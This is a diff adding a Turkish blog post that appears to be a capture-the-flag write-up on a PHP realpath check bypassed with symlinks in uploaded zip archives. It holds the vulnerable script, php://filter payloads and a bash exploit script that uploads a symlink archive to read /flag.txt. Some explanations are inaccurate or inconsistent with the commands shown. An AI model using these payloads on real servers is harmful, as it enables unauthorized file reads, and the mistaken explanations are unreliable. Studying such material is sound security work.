@@ -1,0 +1,148 @@
+---
+title: "PHP RealPath Zafiyeti ve SymLink Çözümü"
+layout: post
+---
+
+
+PHP RealPath() Zafiyeti ve SymLink Çözümü
+
+
+
+## PHP Vuln Script
+
+```php
+
+<?php
+session_start() or die('session_start');
+
+$_SESSION['sandbox'] ??= bin2hex(random_bytes(16));
+$sandbox = 'data/' . $_SESSION['sandbox'];
+$lock = fopen($sandbox . '.lock', 'w') or die('fopen');
+flock($lock, LOCK_EX | LOCK_NB) or die('flock');
+
+@mkdir($sandbox, 0700);
+chdir($sandbox) or die('chdir');
+
+if (isset($_FILES['file']))
+    system('ulimit -v 8192 && /usr/bin/timeout -s KILL 2 /usr/bin/unzip -nqqd . ' . escapeshellarg($_FILES['file']['tmp_name']));
+else if (isset($_GET['file']))
+    if (0 === preg_match('/(^$|flag)/i', realpath($_GET['file']) ?: ''))
+        readfile($_GET['file']);
+
+fclose($lock);
+?>
+
+```
+
+## Açıklama
+
+İlk olarak, `session_start()` işlevi çağrılıyor. Bu, sunucu üzerinde bir oturum oluşturmayı sağlar. Eğer oturum zaten başlatılmışsa veya başlatılamıyorsa `(or die('session_start'))`, betik çalışmayı durdurur.
+Ardından, `$_SESSION` süper global değişkeninde `sandbox` adında bir anahtar kontrol ediliyor. Eğer 'sandbox' anahtarı tanımlı değilse, `random_bytes(16)` işleviyle rastgele bir 16 baytlık dizi oluşturulup `bin2hex` işleviyle hexadecimal bir dizeye dönüştürülerek `$_SESSION['sandbox']` değişkenine atanır.
+`sandbox` dizini, `data/` önekiyle birleştirilerek `$sandbox` değişkenine atanır.
+Bir kilitleme dosyası `($sandbox . '.lock')` oluşturulup açılır `(fopen)`. 
+Eğer dosya açılamazsa `(or die('fopen'))`, betik çalışmayı durdurur.
+flock işlevi, kilitleme dosyasını kilitlemeyi dener. Eğer başka bir işlem tarafından dosya zaten kilitlenmişse veya kilitleme işlemi başarısız olursa `(or die('flock'))`, betik çalışmayı durdurur.
+`mkdir` işleviyle `$sandbox` dizini oluşturulur ve izinleri `0700` olarak ayarlanır. Eğer dizin oluşturulamazsa, betik çalışmayı durdurur.
+`chdir` işleviyle çalışma dizini `$sandbox` dizini olarak değiştirilir. Eğer dizini değiştiremezse, betik çalışmayı durdurur.
+Eğer `$_FILES` süper global değişkeninde 'file' adında bir anahtar varsa, bir dosyanın yüklendiği kontrol edilir.
+system işlevi kullanılarak bir komut yolu belirtilir `(/usr/bin/unzip)` ve yüklenen dosyanın geçici konumunu temsil eden `$_FILES['file']['tmp_name']` değeri işleme dahil edilir.
+Bu komut, belirtilen dosyayı çıkarır `(unzip)` ve `$sandbox` dizinine yerleştirir. 
+`ulimit -v 8192` komutu, işlemin sanal bellek sınırlamasını `8192` kilobayt olarak ayarlar. 
+`/usr/bin/timeout -s KILL 2` komutu, unzip işleminin 2 saniye içinde tamamlanmaması durumunda işlemi sonlandırır.
+
+`escapeshellarg($_FILES['file']['tmp_name']))` --> `escapeshellarg` işlevi, bir dizeyi güvenli bir şekilde kabuk argümanı olarak kullanılabilir hale getirmek için kullanılan bir işlevdir.
+
+Eğer `$_GET` süper global değişkeninde 'file' adında bir anahtar varsa, bir dosyanın okunduğu kontrol edilir.
+
+`$_GET['file']` değeri işlenir ve realpath işlevi kullanılarak dosyanın gerçek yolunu elde eder. Ardından `preg_match` işlevi kullanılarak gerçek dosya yolunun boş veya `flag` kelimesini içerip içermediği kontrol edilir.
+
+`realpath($_GET['file'])` işlemi, belirtilen dosyanın gerçek yolunu döndürür. Eğer dosya yoksa veya gerçek yolu bulunamazsa `false` değeri döner.
+`preg_match('/(^$|flag)/i', realpath($_GET['file'])`, gerçek dosya yolunu verilen düzenli ifadeye göre kontrol eder. İfade, dosya yolunun boş olup olmadığını veya `flag` kelimesini içerip içermediğini kontrol eder. `i` bayrağı büyük/küçük harf duyarlılığını kapatır.
+Eğer gerçek dosya yolü belirlenen kriterleri sağlıyorsa, `readfile` işlevi kullanılarak dosyanın içeriği tarayıcıya gönderilir. Bu, dosyanın içeriğinin tarayıcıda görüntülenmesini sağlar.
+
+Son olarak, `fclose` işlevi kullanılarak kilitleme dosyası kapatılır.
+
+>File Path Check: `$_GET['file']` değeri doğrudan gerçek dosya yolu olarak kullanılıyor. Ancak, realpath işlevi bile olsa bu kullanım güvenli değildir. Kötü niyetli kullanıcılar, dosya yolu manipülasyonu yaparak izin verilmeyen dosyaları okuyabilir veya sistem dosyalarına erişebilir. Güvenli bir dosya yolu kontrolü yapılmalı ve yalnızca belirli bir klasördeki dosyalara erişime izin verilmelidir.
+
+>Command Injection: Dosya yükleme işlemi sırasında `system` işlevi kullanılırken, yüklenen dosyanın güvenli bir şekilde işlenmediği görülüyor. Kötü niyetli kullanıcılar, `$_FILES['file']['tmp_name']` değeri üzerinden komut enjeksiyon saldırıları gerçekleştirebilir ve istenmeyen komutları sunucuda çalıştırabilir. Dosya yükleme işlemi güvenli bir şekilde yapılmalı ve yüklenen dosyaların içeriği doğrulanmalıdır.
+
+>Information Disclosure: Bu istek, readfile işlevini kullanarak bir dosyanın base64 kodlanmış içeriğini tarayıcıya göndermek yerine, "php://filter/convert.base64-encode/resource=exploit" olarak adlandırılan özel bir dosyanın içeriğini kodlayabilir. Eğer bu dosya bir PHP betiği veya hassas bilgiler içeren bir dosya ise, bu sayede saldırgan, hedef sistemin kodunu sızdırabilir veya hassas verilere erişebilir.
+
+>Local File Inclusion: `php://filter/convert.base64-encode/resource=exploit` ifadesi, dosya yolu keşfine yol açabilir. Saldırgan, "exploit" yerine diğer dosya veya dizin isimlerini deneyerek sistemdeki dosyaların listesini elde etmeye çalışabilir. Bu şekilde, saldırgan sistemin dosya yapısını inceleyebilir ve hassas verilerin yerini tespit edebilir.
+
+## Payload
+
+```php
+php://filter/convert.base64-encode/resource=flag.txt
+php://filter/convert.base64-encode/resource=./flag.txt
+```
+Komutları ise bize flag değerini döndürecektir.Fakat önce yukarıda yapıldığı gibi dosya yükleme işlemi yapmak gerekir.
+
+### Bash Script 
+
+```bash
+
+#!/bin/bash
+
+TARGET='http://example.com'
+PAYLOAD='php://filter/convert.base64-encode/resource=exploit'
+
+mkdir -p ExpDir
+pushd ExpDir
+
+mkdir -p "$PAYLOAD"
+ln -s /flag.txt exploit
+zip -y -r exploit.zip *
+
+curl -H 'Cookie: PHPSESSID=OturumBilgisi' "$TARGET" -F "file=@exploit.zip"
+curl -s -H 'Cookie: PHPSESSID=OturumBilgisi' "${TARGET}/?file=${PAYLOAD}" | base64 -d
+
+echo
+popd
+
+```
+### Command
+
+```py
+mkdir file:
+cd file:
+touch flagx.txt
+ln -s flagx.txt flag.txt
+cd ..
+zip -ry flag.zip file
+```
+
+mkdir file: "file" adında bir dizin oluşturur.
+cd file: Oluşturulan "file" dizinine geçiş yapar.
+touch flagx.txt: "flagx.txt" adında boş bir dosya oluşturur.
+ln -s flagx.txt flag.txt: "flag.txt" adında sembolik bir bağlantı oluşturur ve bu bağlantıyı "flagx.txt" dosyasına yönlendirir.
+cd ..: Önceki dizine geri döner.
+zip -ry flag.zip file: "file" dizinini ve içeriğini "recursive" olarak sıkıştırır ve "file_flag.zip" adlı bir zip arşivi oluşturur.
+Bu işlemler sonucunda, "file" dizini içinde "meow.txt" adlı bir dosya ve bu dosyaya bağlantı olarak "flag.txt" adlı sembolik bir bağlantı oluşturulur. Ardından, "file" dizini ve içeriği "file_flag.zip" adlı bir zip arşivine sıkıştırılır.
+
+
+"recursive" terimi, bir işlemi veya işlemi bir dizin ve içeriğindeki tüm alt dizinler üzerinde tekrarlayarak gerçekleştirmeyi ifade eder.
+
+`zip -r` veya `zip -ry` komutları, zip arşivini oluştururken rekürsif olarak çalışır. Bu, belirtilen dizin ve alt dizinlerindeki tüm dosyaları ve alt dizinleri de dahil ederek bir arşiv oluşturur. Dosyaların ve alt dizinlerin içeriği, arşivin içinde hiyerarşik bir yapıda saklanır.
+
+`zip -r` komutu, dizin ve dosyaları sıkıştırmak için kullanılırken, `zip -ry` komutu, sıkıştırma işlemi sırasında sembolik bağlantıları da korur. Bu, sembolik bağlantılara sahip dosyaların da arşivin içine dahil edileceği anlamına gelir.
+
+Örneğin, zip -ry flag.zip file komutunu kullanarak "file" dizinini rekürsif olarak sıkıştırdığınızda, "file" dizini, içindeki dosyalar ve alt dizinler ile birlikte "flag.zip" adlı bir arşive dahil edilir. Bu şekilde, tüm dizin hiyerarşisi ve içerik korunarak sıkıştırma işlemi gerçekleştirilir.
+
+### Symbolic Link (Sembolik Bağlantı)
+
+Bir dosyanın veya dizinin başka bir dosyayı veya dizini işaret etmesini sağlayan bir dosya türüdür. 
+Bir sembolik bağlantı, dosya sistemi üzerinde bir yol bağlantısı oluşturur ve bu sayede bir dosyanın birden fazla konumda bulunmasını sağlar.
+
+
+## Makale
+
+Daha detaylı olarak belirttiğim makaleme ise burada ulaşabilirsiniz [PHP LFI-RFI-RCE](https://cagrieser.com/articles/PHP-LFI-RFI-RCE.pdf)
+
+Aşağıda ki Python Scripti ile gerekli payloadları ayarlarıp dönen yanıtları dışarı aktarıp bakabilirsiniz.
+[https://github.com/cagrieser/ReqWeb](https://github.com/cagrieser/ReqWeb)
+
+Bunun dışında Burp Suite ilede Intruder yapabilirsiniz.
+
+![Web](/img/qwb.gif)
+
